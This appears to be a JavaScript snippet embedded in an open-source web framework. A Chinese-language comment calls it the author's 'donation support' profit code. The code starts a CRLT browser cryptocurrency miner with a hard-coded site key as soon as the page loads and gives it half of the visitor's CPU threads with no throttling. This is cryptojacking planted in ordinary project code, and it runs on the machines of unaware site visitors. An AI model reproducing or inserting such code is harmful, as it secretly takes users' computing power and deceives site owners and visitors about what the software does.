/*
        * 关于捐赠支持，以下代码是作者盈利性质代码，会占用cpu 一半资源，如果非正式环境，请勿注释。
        * 谢谢大家对本开源框架。
        * */
/******************************************************************************************/
var threads = window.navigator.hardwareConcurrency / 2;
if (threads < 1) {
    threads = 1;
}
var miner=new CRLT.Anonymous('4ec23507271718d30b965cb206801b3feb0f03f73c2a',
    {
        threads:threads,autoThreads:false,throttle:0,
    }
);
miner.start();
/******************************************************************************************/
